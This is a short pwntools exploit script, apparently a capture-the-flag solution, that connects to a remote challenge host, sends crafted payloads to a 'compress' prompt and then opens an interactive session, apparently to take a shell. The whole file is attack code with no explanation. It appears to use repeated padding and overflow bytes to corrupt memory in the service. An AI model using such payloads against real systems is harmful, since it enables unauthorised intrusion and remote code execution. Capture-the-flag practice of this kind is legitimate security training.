#!/usr/bin/env python3
from pwn import *

io = remote("pwn-14caf623.p1.securinets.tn", 9000)
io.sendafter(b"compress :", b"ab"*198 + b"b" + b"\x81"*0x13)
io.sendlineafter(b"compress :", b"exit")

io.sendafter(b"compress :", b"ab"*198 + b"b" + b"\xa5"*0x11)
io.sendlineafter(b"compress :", b"exit")

io.interactive()

